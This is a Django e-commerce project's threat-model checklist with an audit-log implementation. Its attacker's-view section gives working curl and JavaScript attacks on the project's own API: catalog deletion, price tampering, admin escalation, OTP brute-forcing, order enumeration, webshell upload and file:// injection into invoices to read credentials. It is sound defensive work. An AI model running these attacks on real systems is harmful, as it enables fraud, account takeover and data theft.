# Threat model

This file owns the pre-ship review: a reusable set of yes/no questions derived from what actually went wrong in this project.

## How to use it

Work it before any release that touches auth, money, uploads, roles or settings. Every question is answerable **yes** or **no** — if the answer is "probably" or "I think so", the answer is no, and you go and check.

Questions carry the audit ID they came from. An ID means this is not a hypothetical: it happened here, in this codebase, and shipped.

The seven sections are ordered by how much damage the failure caused, not by how likely it is. Identity and server authority are first because S1, S2, S5 and S8 are all in them.

## Identity and access

- [ ] Does **every** ViewSet and APIView declare `permission_classes` in its own class body? (**S2**)
- [ ] Is `DEFAULT_PERMISSION_CLASSES` deny-by-default, so a missing declaration produces a 403 rather than write access? (**S2**)
- [ ] Does any `ModelViewSet` have `permission_classes = [AllowAny]`? (**S1**)
- [ ] For every endpoint that is intentionally `AllowAny`, is there a written reason and a throttle?
- [ ] Does any `has_permission` or `has_object_permission` end in an unconditional `return True`? (**S6**)
- [ ] Does every permission class fail **closed** — enumerating what is allowed, denying the rest? (**S6**)
- [ ] Does every owner-scoped ViewSet have **both** a permission class and a filtered `get_queryset()`?
- [ ] Does every custom `@action` either call `self.get_object()` or check permissions by hand?
- [ ] Are role-gated endpoints using `HasRole(...)` rather than an inline `if user.role == ...` inside the view?
- [ ] Is `is_staff` set only through a staff-only, audited endpoint — never through a profile update? (**N9**)
- [ ] Does the frontend admin guard re-verify against the server, and does every admin action still fail if the guard is removed entirely? (**S7/S8**)
- [ ] Are JWT lifetimes bounded, with rotation and blacklist-after-rotation enabled?
- [ ] Does logout blacklist the refresh token server-side, rather than only clearing `localStorage`?
- [ ] Can a deactivated or role-demoted user still act with a token issued before the change? (Access tokens live 15 minutes — is that acceptable for this action?)

## Server authority

- [ ] Does any write serializer use `fields = '__all__'`? (**S5**)
- [ ] Is every unit price read from a re-fetched `ProductAttribute`, never from the request body? (**S5**)
- [ ] Is there any fallback path that uses a client-supplied price when a lookup fails? (**S5**)
- [ ] Is `total_amount` computed as the sum of created `OrderItem` subtotals, after creation? (**S5**)
- [ ] Are discounts, tax and shipping computed server-side from server-held rules?
- [ ] Is `user`/owner assigned from `request.user`, never from the payload?
- [ ] Are `is_staff`, `is_superuser`, `role`, `is_active` and `otp` read-only in every customer-facing serializer?
- [ ] Does order `status` move only through an explicit transition table, with terminal states terminal?
- [ ] Is `created_at` read-only?
- [ ] Is a client-supplied `transaction_id` treated as *pending verification* rather than as proof of payment?
- [ ] Is a bKash transaction verified against the provider for **status, amount and currency** — not merely for existence?
- [ ] Is `transaction_id` `unique=True`, so one transaction cannot settle two orders?
- [ ] Do stock decrements use `select_for_update()` or a conditional `.update()`, so two concurrent orders cannot oversell?
- [ ] Is every lookup by a client-supplied id scoped to what the actor may reach, so IDOR returns 404?
- [ ] For nested writes, is it validated that referenced objects belong together (that `attribute.product_id == product.pk`)?
- [ ] Does order creation require an `Idempotency-Key`, enforced by a unique constraint? (**N10**)
- [ ] Is order tracking keyed on a random token rather than a sequential integer?

## Input and injection

- [ ] Is every database query built through the ORM or with parameters — no f-strings or `%` formatting into `.raw()` or `.extra()`?
- [ ] If `.raw()` or `cursor.execute()` is used anywhere, are all values passed as parameters rather than interpolated?
- [ ] Are numeric and decimal inputs validated for range and sign — no negative `quantity`, no negative `discount` that inverts a total?
- [ ] Are `Decimal` values used for money throughout, never `float`?
- [ ] Is every user-supplied string that reaches a template autoescaped, with no `|safe` on customer data?
- [ ] Does the xhtml2pdf `link_callback` refuse `file://`, `http://`, `https://` and anything outside `STATIC_ROOT`? (**N5**)
- [ ] Are invoices rendered from a database re-fetch rather than from `request.data`?
- [ ] Does every `ImageField`/`FileField` carry `validate_image_file` or `validate_document_file`? (**N5**)
- [ ] Is the extension check an **allowlist**, never a denylist? (**N5**)
- [ ] Are magic bytes and a Pillow decode verified, not just the client's `Content-Type`? (**N5**)
- [ ] Is every `upload_to` a `safe_upload_to(...)` call, so the client filename is discarded? (**N5**)
- [ ] Are images re-encoded on save, stripping EXIF and any appended payload? (**N5**)
- [ ] Is `Image.MAX_IMAGE_PIXELS` set and `DecompressionBombWarning` promoted to an error? (**N5**)
- [ ] Is SVG rejected on every upload field? (**N5**)
- [ ] Are upload size limits set in Django **and** at the web server? (**N5**)
- [ ] Is any user-supplied value interpolated into a shell command, a redirect URL, or an email header?
- [ ] Are `next`/redirect parameters validated against an allowlist of internal paths?

## Secrets and configuration

- [ ] Does any credential appear as a literal anywhere in tracked source? (**S3**)
- [ ] Is every secret read through a fail-fast `env()` helper that raises when a required key is missing? (**S3**)
- [ ] Does any `os.environ.get()` call have a secret as its **key name**, or a real secret as its default? (**S3**)
- [ ] Is `.env` ignored and `.env.example` committed with every key present?
- [ ] Are `db.sqlite3`, `*.log` and `/media/` untracked?
- [ ] Is pre-commit secret scanning installed, and does CI scan the full tree?
- [ ] For any secret that was ever committed: has it been **rotated**, not merely deleted? (**S3**)
- [ ] Does `DEBUG` default to `False` and require an explicit opt-in? (**S4**)
- [ ] Are `SECURE_SSL_REDIRECT`, `SESSION_COOKIE_SECURE` and `CSRF_COOKIE_SECURE` all `True` in production? (**S4**)
- [ ] Is `SECURE_PROXY_SSL_HEADER` set, **and** does nginx overwrite `X-Forwarded-Proto` rather than pass it through?
- [ ] Are HSTS, `nosniff`, referrer policy and `X_FRAME_OPTIONS` set?
- [ ] Does `ALLOWED_HOSTS` contain no `'*'` and no entries with a scheme or trailing slash? (**S4**)
- [ ] Is `CORS_ALLOW_ALL_ORIGINS` absent, and is every origin regex anchored with `^` and `$`?
- [ ] Does `python manage.py check --deploy --fail-level WARNING` exit 0 against production environment variables? (**S4**)
- [ ] Is every entry in `SILENCED_SYSTEM_CHECKS` accompanied by a reason, an owner and a review date?
- [ ] Does no log line, error message or DRF response contain a secret value? (**S3**)

## Rate and abuse

- [ ] Are `DEFAULT_THROTTLE_CLASSES` and `DEFAULT_THROTTLE_RATES` configured at all? (**N2**)
- [ ] Is a **shared** cache backend configured — not `LocMemCache`, which is per-worker and resets on restart? (**N2**)
- [ ] Does `/auth/verify-otp/` carry both an IP-keyed and an email-keyed throttle? (**N2**)
- [ ] Do `/auth/login/`, `/auth/registration/`, `/auth/check-username/` and `/place_order/` all declare throttles? (**N2**)
- [ ] Does the OTP expire, count attempts, and invalidate after a threshold? (**N2**)
- [ ] Is the OTP generated with `secrets`, not `random`? (**N2**)
- [ ] Is the OTP compared with `hmac.compare_digest` rather than `==`? (**N2**)
- [ ] Does `NUM_PROXIES` match the real proxy count, so per-IP throttling is not collapsing everyone into one bucket?
- [ ] Does every rate string use `second`, `minute`, `hour` or `day` — never `week`, which silently parses as seconds?
- [ ] Are list endpoints paginated? (`ProductViewSet` currently sets `pagination_class = None`.)
- [ ] Are 429 responses logged, so a sustained attack is visible rather than merely blocked? (**N9**)
- [ ] Does the frontend surface `Retry-After` and never auto-retry a 429 in a loop?

## Data exposure

- [ ] Does any list endpoint return rows the requester should not see? (Check `get_queryset()` on every owner-scoped ViewSet.)
- [ ] Is `buying_price` excluded from every customer-facing serializer?
- [ ] Are `otp`, password hashes and internal flags absent from all API responses?
- [ ] Does `/orders/<id>/track/` require something unguessable, rather than a sequential id under `AllowAny`?
- [ ] Do error responses avoid confirming whether an email address is registered? (A 404 for an unknown email and a 400 for a wrong OTP is an enumeration oracle.)
- [ ] Does `/auth/check-username/` have a throttle, given it is an enumeration oracle by design?
- [ ] Is media served from a separate origin, or with `nosniff` and `Content-Disposition: attachment` for non-images? (Relevant because the JWT lives in `localStorage`.)
- [ ] Are uploaded files at unguessable paths, so a customer's profile picture is not enumerable?
- [ ] Are EXIF GPS coordinates stripped from customer-uploaded photos? (**N5**)
- [ ] Do invoice PDFs go only to the address on the order, and is the invoice URL unguessable?
- [ ] Is `DEBUG` off, so a 500 does not render the settings dict and local variables? (**S4**, **S3**)
- [ ] Are tracebacks and request bodies kept out of any log that is tracked, shipped, or world-readable?

## Audit and forensics

- [ ] Does an append-only audit log exist at all? (**N9**)
- [ ] Is every privileged action written to it? (**N9**)
- [ ] Does each entry carry actor, action, target, before/after, IP and timestamp? (**N9**)
- [ ] Is the log append-only in practice — no `update()`, no `delete()`, no admin edit? (**N9**)
- [ ] Are failed authorization attempts, 429s and payment-verification failures recorded, not just successes? (**N9**)
- [ ] Are order-total mismatches between the client's claim and the server's computation logged? (**S5**, **N9**)
- [ ] Can you answer "who changed this price, and when?" from the log alone? (**N9**)
- [ ] Is there a retention period, and is the log excluded from anything the application can rewrite?

## If I had a customer account, what would I try?

The attacker's view. Every answer below is a real finding from this project, which is what makes this section worth keeping rather than replacing with generic advice.

**"Can I write to the catalog?"**

```bash
curl -X POST https://api.delhialuminium.com/products/ \
  -H "Authorization: Bearer $CUSTOMER_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"name":"pwned","slug":"pwned","productcode":"X1","description":"","category":1}'
```

**S1** made this work with no token at all — `permission_classes = [AllowAny]` on a `ModelViewSet` means anonymous POST, PUT and DELETE across the whole catalog. Expect 401 anonymous, 403 as a customer.

**"What about the things nobody declared permissions on?"**

```bash
curl -X DELETE https://api.delhialuminium.com/categories/3/ \
  -H "Authorization: Bearer $CUSTOMER_TOKEN"
```

**S2**. `CategoryViewSet` and `BrandViewSet` had no `permission_classes`, so the global `IsAuthenticatedOrReadOnly` applied and any signed-in shopper could write. `Product.category` is `on_delete=CASCADE`, so one DELETE from a customer account removes every product under that category. This is the highest-damage finding in the audit and it required no skill whatsoever.

**"Can I set my own price?"**

```bash
curl -X POST https://api.delhialuminium.com/orders/ \
  -H "Authorization: Bearer $CUSTOMER_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"total_amount":"1.00","status":"completed","payment_method":"cod",
       "contact_number":"01700000000","street_address":"House 12","city":"Dhaka",
       "items":[{"product":42,"attribute":118,"quantity":10,"price":"0.10"}]}'
```

**S5**. `fields = '__all__'` plus a writable `price` on the nested item serializer meant ten units of a ৳45,000 product for ৳1, marked `completed`. And if the lookup path is defended but retains a fallback, just omit `attribute` and the client price is used again.

**"Can I make myself an admin?"**

```js
let u = JSON.parse(localStorage.getItem('user'));
u.is_staff = true;
localStorage.setItem('user', JSON.stringify(u));
```

**S7/S8**. Reload, and the full admin panel rendered. The panel was guarded only by that value. Note precisely what the fix is and is not: re-verifying against `/auth/me/` stops the *panel* rendering, but the control that matters is that every endpoint the panel calls returns 403 regardless. Test with the guard removed.

```bash
curl -X PATCH https://api.delhialuminium.com/users/57/ \
  -H "Authorization: Bearer $CUSTOMER_TOKEN" \
  -d '{"is_superuser": true, "role": "admin"}'
```

Expect 403, and expect `is_superuser` and `role` to be read-only even if it were 200.

**"Can I brute-force my way into someone's account?"**

```bash
for otp in $(seq -w 100000 999999); do
  curl -s -X POST https://api.delhialuminium.com/auth/verify-otp/ \
    -H 'Content-Type: application/json' \
    -d "{\"email\":\"victim@example.com\",\"otp\":\"$otp\"}"
done
```

**N2**. A 6-digit code, unlimited attempts, no expiry, no lockout. Minutes with any parallelism. And because `random.randint` is a Mersenne Twister, an attacker who registers a few accounts of their own can predict the victim's code without guessing at all.

**"Can I read other people's orders?"**

```bash
for id in $(seq 1 500); do
  curl -s "https://api.delhialuminium.com/orders/$id/track/"
done
```

`OrderViewSet.track` is `AllowAny` and looks up by raw `pk`, returning `customer_name`, `total_amount`, `payment_method` and `status`. No account needed. A sequential id is an invitation.

**"Can I get code execution?"**

```bash
curl -X POST https://api.delhialuminium.com/product-images/ \
  -H "Authorization: Bearer $TOKEN" \
  -F 'image=@shell.php;type=image/jpeg;filename=cat.jpg'
```

**N5**. And separately, without uploading anything: place an order with `street_address` set to `<img src="file:///home/asshippi/daf_backend/daf_backend/settings.py">`, then read the S3 credentials out of the invoice PDF that gets emailed. `place_order` is `AllowAny`, so this needs no account either.

**"Can I get paid-for goods for free?"**

```bash
curl -X POST https://api.delhialuminium.com/place_order/ \
  -H 'Content-Type: application/json' \
  -d '{"payment_method":"bkash","transaction_id":"9XYZ1A2B3C", ...}'
```

An invented `transaction_id`, accepted on trust, and the order enters fulfilment as paid.

**"Can I cost them money without breaking in?"**

Double-submit checkout (**N10**) for duplicate orders and duplicate courier bookings. Loop registration to burn the Gmail sending quota and the domain's sending reputation. Race two orders for the last unit in stock. None of these require a vulnerability in the usual sense — they exploit the absence of idempotency, throttling and locking.

## The audit log (N9)

There was no audit log. That is not only a compliance gap; it means that after any of the above, **you cannot tell what happened**. You cannot answer which orders were tampered with, when the price changed, or which account did it. Detection and recovery both depend on this.

### What must be logged

| Action | Why |
| --- | --- |
| `user.role_changed`, `user.staff_granted` | Privilege escalation is the highest-value target |
| `user.deactivated`, `user.password_reset` | Account takeover trail |
| `auth.login_failed`, `auth.otp_failed` | Brute-force detection (**N2**) |
| `auth.token_reuse_detected` | SimpleJWT blacklist hit means a stolen refresh token |
| `product.price_changed` | `mainPrice`, `discountedPrice`, `buying_price` |
| `order.status_changed` | Especially any move to `completed` |
| `order.edited` | Any change to `total_amount` or items after creation |
| `order.total_mismatch` | Client claimed a different total than the server computed (**S5**) |
| `payment.verification_failed`, `payment.replay_attempt` | Fraud signal |
| `stock.adjusted` | Every `GodownReceive`, `GodownDispatch` and manual correction |
| `permission.denied` | Repeated 403s from one actor is reconnaissance |
| `throttle.exceeded` | Repeated 429s is an attack in progress |
| `upload.rejected` | Rejected uploads cluster when someone is probing (**N5**) |

### The model

```python
from django.conf import settings
from django.db import models


class AuditLog(models.Model):
    """Append-only record of privileged actions. See references/07-threat-model.md (N9).

    Never update or delete a row here. The value of this table is that it is
    the one place in the system a compromised admin account cannot rewrite.
    """

    actor = models.ForeignKey(
        settings.AUTH_USER_MODEL,
        null=True, blank=True,
        on_delete=models.SET_NULL,      # keep the row when a user is deleted
        related_name='audit_entries',
    )
    actor_email = models.CharField(max_length=254, blank=True, default='')
    action = models.CharField(max_length=64, db_index=True)
    target_type = models.CharField(max_length=64, blank=True, default='')
    target_id = models.CharField(max_length=64, blank=True, default='', db_index=True)
    before = models.JSONField(null=True, blank=True)
    after = models.JSONField(null=True, blank=True)
    ip = models.GenericIPAddressField(null=True, blank=True)
    user_agent = models.CharField(max_length=300, blank=True, default='')
    created_at = models.DateTimeField(auto_now_add=True, db_index=True)

    class Meta:
        ordering = ['-created_at']
        indexes = [models.Index(fields=['action', '-created_at'])]

    def save(self, *args, **kwargs):
        if self.pk is not None:
            raise ValueError('AuditLog rows are immutable.')
        if self.actor and not self.actor_email:
            # Denormalised so the trail survives the user being deleted.
            self.actor_email = self.actor.email
        super().save(*args, **kwargs)

    def delete(self, *args, **kwargs):
        raise ValueError('AuditLog rows cannot be deleted.')

    def __str__(self):
        return f'{self.created_at:%Y-%m-%d %H:%M} {self.actor_email or "system"} {self.action}'
```

`on_delete=models.SET_NULL` with a denormalised `actor_email` is deliberate: deleting a user must not erase the record of what they did.

### Append-only in practice

The `save`/`delete` overrides stop application code. They do not stop `QuerySet.update()`, `QuerySet.delete()`, the Django admin, or a `TRUNCATE` from someone with the MySQL password (**S3**). Close each:

```python
from django.contrib import admin


@admin.register(AuditLog)
class AuditLogAdmin(admin.ModelAdmin):
    list_display = ['created_at', 'actor_email', 'action', 'target_type', 'target_id', 'ip']
    list_filter = ['action', 'created_at']
    search_fields = ['actor_email', 'target_id', 'action']
    readonly_fields = [f.name for f in AuditLog._meta.fields]

    def has_add_permission(self, request):
        return False

    def has_change_permission(self, request, obj=None):
        return False

    def has_delete_permission(self, request, obj=None):
        return False
```

For real tamper-resistance, the log must leave the box: ship entries to a write-only external sink, or an append-only file shipped off-host, or grant the application's MySQL user only `INSERT` on this table. A log an attacker with your database password can edit is evidence only until they think to edit it.

### The helper

```python
import logging

logger = logging.getLogger('security.audit')


def audit(request, action, target=None, before=None, after=None):
    """Write an audit entry. Never let a logging failure break the operation."""
    actor = getattr(request, 'user', None)
    if actor is not None and not actor.is_authenticated:
        actor = None
    try:
        AuditLog.objects.create(
            actor=actor,
            action=action,
            target_type=target.__class__.__name__ if target is not None else '',
            target_id=str(getattr(target, 'pk', '') or ''),
            before=before,
            after=after,
            ip=request.META.get('REMOTE_ADDR'),
            user_agent=request.META.get('HTTP_USER_AGENT', '')[:300],
        )
    except Exception:
        # An audit write must not take down a checkout. But it must be loud.
        logger.exception('AUDIT_WRITE_FAILED action=%s', action)
```

Two rules about the payload. **Never put a secret, password, OTP or token in `before`/`after`** — this table is queried by more people than any other (`04-secrets.md`). And record only the fields that changed, not the whole object, so a diff is readable a year later.

Usage:

```python
before = {'mainPrice': str(attribute.mainPrice), 'discountedPrice': str(attribute.discountedPrice)}
serializer.save()
attribute.refresh_from_db()
audit(request, 'product.price_changed', target=attribute, before=before,
      after={'mainPrice': str(attribute.mainPrice),
             'discountedPrice': str(attribute.discountedPrice)})
```

`str()` on the `Decimal` values because `JSONField` cannot serialise `Decimal` — and because a price recorded as a float has already lost the thing you were trying to record.

Timestamps are stored UTC and render in `Asia/Dhaka`, which is what an investigator here needs when correlating against courier and bKash records.

## Related

- `references/01-permissions.md` — identity and access
- `references/02-throttling.md` — rate and abuse
- `references/03-settings-hardening.md` — secrets and config
- `references/04-secrets.md` — the S3 post-mortem and incident response
- `references/05-uploads.md` — input and injection for files
- `references/06-server-authority.md` — server authority
- `checklists/pre-deploy-security.md` — the mechanical gate this review feeds
